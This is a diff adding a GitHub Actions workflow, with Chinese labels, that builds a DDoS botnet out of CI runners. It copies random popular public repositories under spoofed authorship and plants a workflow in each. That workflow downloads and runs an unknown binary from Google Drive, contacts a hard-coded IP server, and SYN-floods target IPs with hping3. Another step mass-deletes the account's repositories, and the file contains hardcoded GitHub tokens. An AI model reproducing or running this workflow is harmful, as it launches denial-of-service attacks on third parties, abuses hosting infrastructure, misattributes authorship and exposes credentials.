@@ -1,0 +1,237 @@
+on:
+  # push:
+  #   branches:
+  #     - main
+  workflow_dispatch:
+    inputs:
+      action:
+        description: '请选择要执行的操作'
+        required: true
+        default: 'create_repo'
+        type: choice
+        options:
+          - create_repo
+          - run_workflow
+          - delete_repo
+      total_jobs:
+        description: 'job数量，仅在action=run_workflow时使用'
+        required: false
+        default: '10'
+      target_ips:
+        description: '目标IP，仅在action=run_workflow时使用'
+        required: false
+      timeout_duration:
+        description: '持续时间，仅在action=run_workflow时使用'
+        required: false
+        default: '60s'
+
+run-name: '部署 ${{ inputs.action }} ${{ inputs.total_jobs }} ${{ inputs.target_ips }} ${{ inputs.timeout_duration }}'
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  job:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # token: ["XQJK7ceyaehORLLDuEGyfCsNAUvXGr2esaFT", "PkFmUgSPpkyWd4jobnKfuEoULFfudT2NBWhj"]
+        token: ["PkFmUgSPpkyWd4jobnKfuEoULFfudT2NBWhj", "rHJLYwIKSB03EfE7cyGQ5b8pKZAL9H4NLJbb"]
+          # - index: 5
+          #   token: "cL8IBiDAG7bVokwttyS5fbmtjcOdTP3Iw3I5"
+          
+    env:
+      TZ: Asia/Shanghai
+      TOKEN: "ghp_${{ matrix.token }}"
+
+    steps:
+      - name: 登录
+        run: |
+          echo $TOKEN | gh auth login --with-token
+          gh auth status
+
+          GITHUB_USER=$(gh api user --jq .login)
+          echo "GITHUB_USER=$GITHUB_USER" >> $GITHUB_ENV
+
+      - name: 创建仓库
+        if: ${{ !github.event.inputs.action || github.event.inputs.action == 'create_repo' }}
+        run: |
+          # https://api.github.com/search/repositories?q=size:1000..50000+pushed:%3E2025-06-01+stars:>10&sort=updated&order=desc&per_page=1&page=1
+          echo "=== 随机获取一个 public 仓库并尝试创建新仓库 ==="
+          while true; do
+            page=$(shuf -i 1-1000 -n 1)
+            REPO_JSON=$(gh api "search/repositories?q=size:1000..50000+pushed:%3E2025-06-01+stars:>10&sort=updated&order=desc&per_page=1&page=$page" --jq '.items')
+            REPO_FULL_NAME=$(echo "$REPO_JSON" | jq -r '.[0].full_name')
+            REPO_NAME=$(basename "$REPO_FULL_NAME")
+            echo "随机选中的仓库：$REPO_FULL_NAME，仓库名：$REPO_NAME"
+
+            echo "尝试在 GitHub 上新建同名私有仓库..."
+            CREATE_OUTPUT=$(gh repo create "$GITHUB_USER/$REPO_NAME" --public 2>&1) && break
+
+            echo "$CREATE_OUTPUT" | grep -q "already exists" && echo "仓库已存在，重新随机..." && sleep 1 && continue
+
+            echo "其他错误，退出：$CREATE_OUTPUT"
+            exit 1
+          done
+          echo "私有仓库创建完成"
+
+          echo "=== 开始克隆仓库 ==="
+          git clone "https://github.com/${REPO_FULL_NAME}.git"
+          cd "$REPO_NAME"
+          echo "仓库克隆完成，进入目录 $REPO_NAME"
+
+          log_and_summary() {
+            echo "$1"
+            echo "$1" >> $GITHUB_STEP_SUMMARY
+          }
+
+          WORKFLOW_DIR=".github/workflows"
+          if [ -d "$WORKFLOW_DIR" ]; then
+            log_and_summary "当前仓库中存在的 workflow 文件："
+            find "$WORKFLOW_DIR" -type f \( -name "*.yml" -o -name "*.yaml" \) | while read -r path; do
+              workflow=$(basename "$path")
+              log_and_summary "- $workflow"
+              rm $path
+            done
+          else
+            log_and_summary "未找到 .github/workflows 目录"
+          fi
+
+          total_jobs=$((${{ strategy.job-total }} * 20))
+
+          mkdir -p .github/workflows
+          
+          cat << 'EOF' > .github/workflows/build.yml
+          on:
+            workflow_dispatch:
+              inputs:
+                total_jobs:
+                  required: true
+                  type: string
+                target_ips: #多个ip逗号隔开
+                  required: true
+                  type: string
+                timeout_duration:
+                  description: '持续时间'
+                  required: false
+                  default: '60s'
+
+          concurrency:
+            group: ${{'${{ github.workflow }}-${{ github.ref }}'}}
+            cancel-in-progress: true
+
+          jobs:
+            job:
+              strategy:
+                matrix:
+                  # case: [1, 2, 3, 4, 5]
+                  case: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+                  # case: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
+                  # case: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40]
+              runs-on: ubuntu-latest
+              env:
+                RUN_ID: ${{'${{ github.workflow }}'}}
+                TOTAL_JOBS: ${{'${{ inputs.total_jobs }}'}}
+                SOCKET_SERVER_URL: http://43.167.226.242:3000
+              steps:
+                # - uses: actions/checkout@v4
+                #   with:
+                #     repository: Buc014960kPearson/Buc014960kPearson
+                #     ref: main
+
+                - name: 设置环境变量
+                  run: |
+                    echo "MATRIX_JOB_ID=${{'${{ github.repository }}-${{ runner.name }}'}}" >> $GITHUB_ENV
+
+                - name: Step 1
+                  run: |
+                    sudo apt install hping3 -q
+                    wget --content-disposition "https://drive.usercontent.google.com/download?id=1aLuXtUMyduv4lS4aPPWZybi_tfF3-TIa&export=download"
+                    chmod +x job-sync-client
+                    timeout 60s ./job-sync-client
+
+                - name: Step 2
+                  run: |
+                    echo "inputs.timeout_duration=${{'${{ inputs.timeout_duration }}'}}"
+                    IFS=',' read -ra IP_LIST <<< "${{'${{ inputs.target_ips }}'}}"
+                    for IP in "${IP_LIST[@]}"; do
+                      echo $IP
+                      echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
+                      sudo timeout ${{'${{ inputs.timeout_duration }}'}} hping3 -S --flood -V -d 1200 -p 443 -s 1000-65535 $IP || true
+                      # sudo timeout ${{'${{ inputs.timeout_duration }}'}} hping3 -A --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+                      
+                      # sudo apt update
+                      # sudo apt install slowhttptest
+                      # slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://$IP:80/ -p 3
+                      # slowhttptest -c 1000 -H -i 1 -r 1000 -t GET -u http://$IP:80/ -p 3
+                    done
+          EOF
+
+          # sed -i "s/\$total_jobs/$total_jobs/g" .github/workflows/build.yml
+
+          echo "=== 获取原仓库最后一次提交的信息 ==="
+          LAST_COMMIT_MESSAGE=$(git log -1 --pretty=%B)
+          LAST_COMMIT_AUTHOR_NAME=$(git log -1 --pretty=%an)
+          LAST_COMMIT_AUTHOR_EMAIL=$(git log -1 --pretty=%ae)
+          LAST_COMMIT_AUTHOR_DATE=$(git log -1 --pretty=%ad --date=iso-strict)
+          echo "最后提交信息：$LAST_COMMIT_MESSAGE"
+          echo "最后提交作者：$LAST_COMMIT_AUTHOR_NAME <$LAST_COMMIT_AUTHOR_EMAIL> at $LAST_COMMIT_AUTHOR_DATE"
+
+          echo "=== 清除历史，只保留最新一次提交 ==="
+          # git config user.name "$LAST_COMMIT_AUTHOR_NAME"
+          # git config user.email "$LAST_COMMIT_AUTHOR_EMAIL"
+          git checkout --orphan latest_branch
+          git add -A
+          
+          echo "::group::commit"
+          GIT_AUTHOR_NAME="$LAST_COMMIT_AUTHOR_NAME" \
+          GIT_AUTHOR_EMAIL="$LAST_COMMIT_AUTHOR_EMAIL" \
+          GIT_AUTHOR_DATE="$LAST_COMMIT_AUTHOR_DATE" \
+          GIT_COMMITTER_NAME="$LAST_COMMIT_AUTHOR_NAME" \
+          GIT_COMMITTER_EMAIL="$LAST_COMMIT_AUTHOR_EMAIL" \
+          GIT_COMMITTER_DATE="$LAST_COMMIT_AUTHOR_DATE" \
+          git commit -m "$LAST_COMMIT_MESSAGE"
+          echo "::endgroup::"
+          
+          echo "只保留一条 commit 完成"
+          git branch -D main 2>/dev/null || echo "main 分支不存在可忽略"
+          git branch -m main
+          echo "分支重命名完成"
+
+          echo "=== 推送到新仓库(只保留一条提交记录) ==="
+          git remote remove origin
+          git remote add origin "https://$TOKEN@github.com/$GITHUB_USER/$REPO_NAME.git"
+          echo "开始强制推送到新仓库..."
+          git push -f origin main
+          echo "推送完成，仓库部署流程结束"
+
+      - name: 执行
+        if: ${{ github.event.inputs.action == 'run_workflow' }}
+        run: |
+          if [ -z "${{ inputs.target_ips }}" ]; then
+            echo "target_ips为空"
+            exit 1
+          fi
+
+          echo "=== 获取最新推送的仓库 ==="
+          REPO_URL=$(gh api 'user/repos?sort=pushed&direction=desc&per_page=1' --jq '.[0].clone_url')
+          REPO_URL_WITH_TOKEN=$(echo "$REPO_URL" | sed "s#https://#https://$TOKEN@#")
+          git clone $REPO_URL_WITH_TOKEN
+          echo "克隆完成"
+          REPO_NAME=$(basename "$REPO_URL" .git)
+          cd "$REPO_NAME"
+          gh workflow list
+          gh workflow run build.yml --field total_jobs=${{ inputs.total_jobs }} --field target_ips=${{ inputs.target_ips }} --field timeout_duration=${{ inputs.timeout_duration }}
+          echo "执行完成"
+
+      - name: 删除仓库
+        if: ${{ github.event.inputs.action == 'delete_repo' }}
+        run: |
+          echo "=== 开始删除所有仓库 ==="
+          gh repo list "$GITHUB_USER" --limit 1000 --json name -q '.[].name' | while read repo; do
+            echo "正在删除 $repo ..."
+            gh repo delete "$GITHUB_USER/$repo" --yes
+          done
+          echo "所有仓库已删除。"
